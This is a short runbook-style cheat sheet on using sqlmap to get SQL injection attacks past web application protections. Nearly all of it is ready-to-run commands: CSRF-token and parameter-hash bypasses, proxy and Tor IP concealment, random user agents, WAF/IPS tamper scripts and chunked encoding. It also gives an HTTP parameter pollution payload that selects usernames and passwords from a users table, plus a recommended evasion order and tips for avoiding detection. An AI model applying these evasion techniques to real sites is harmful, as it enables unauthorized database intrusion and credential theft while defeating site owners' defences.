# SQLMap – Bypassing Web Application Protections (Runbook)

---

## Anti-CSRF Token Bypass
Auto-refresh CSRF tokens per request.

```bash
sqlmap -u http://target.com/ \
  --data="id=1&csrf-token=XYZ" \
  --csrf-token=csrf-token
````

✔ SQLMap parses responses for fresh tokens
✔ Auto-prompts if param contains `csrf`, `xsrf`, `token`

---

## Unique Value Bypass

Randomize required unique parameters.

```bash
sqlmap -u "http://target.com/?id=1&rp=12345" \
  --randomize=rp
```

---

## Calculated Parameter Bypass

Recalculate dependent params (hashes, checksums).

```bash
sqlmap -u "http://target.com/?id=1&h=md5hash" \
  --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

---

## IP Concealment / Blacklist Bypass

### Single Proxy

```bash
sqlmap ... --proxy="socks4://IP:PORT"
```

### Proxy List

```bash
sqlmap ... --proxy-file=proxies.txt
```

### Tor Network

```bash
sqlmap ... --tor --check-tor
```

---

## WAF Detection / Control

### Detect & Identify WAF (default)

✔ Uses `identYwaf`

### Skip WAF Detection (less noise)

```bash
sqlmap ... --skip-waf
```

---

## User-Agent Blacklist Bypass

```bash
sqlmap ... --random-agent
```

⚠️ Default SQLMap UA is often blocked

---

## Tamper Scripts (WAF / IPS Bypass)

### Use Tamper Scripts

```bash
sqlmap ... --tamper=between,randomcase
```

### List Available Tampers

```bash
sqlmap --list-tampers
```

### Common Tampers

| Script            | Purpose                  |   |   |
| ----------------- | ------------------------ | - | - |
| `between`         | Replaces `=` / `>` logic |   |   |
| `randomcase`      | Random keyword casing    |   |   |
| `space2comment`   | Space → comment          |   |   |
| `space2plus`      | Space → `+`              |   |   |
| `symboliclogical` | AND/OR → `&& /           |   | ` |
| `percentage`      | `%`-encode keywords      |   |   |
| `equaltolike`     | `=` → `LIKE`             |   |   |

✔ Tampers can be chained
✔ Order matters (priority-based)

---

## Chunked Transfer Encoding

Split payload across chunks.

```bash
sqlmap ... --chunked
```

---

## HTTP Parameter Pollution (HPP)

Split payload across repeated params.

```text
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
```

Works on platforms that concatenate params (e.g. ASP).

---

## Recommended Bypass Order

1️⃣ `--random-agent`
2️⃣ `--csrf-token` / `--randomize`
3️⃣ `--eval` (hash-based params)
4️⃣ `--tamper` (minimal first)
5️⃣ `--chunked` / HPP
6️⃣ Proxies / Tor (last resort)

---

## Pro Tips

* Start **simple**, add bypasses only when blocked
* Overusing tampers = detection failure
* Combine with `-v 3` to debug payloads


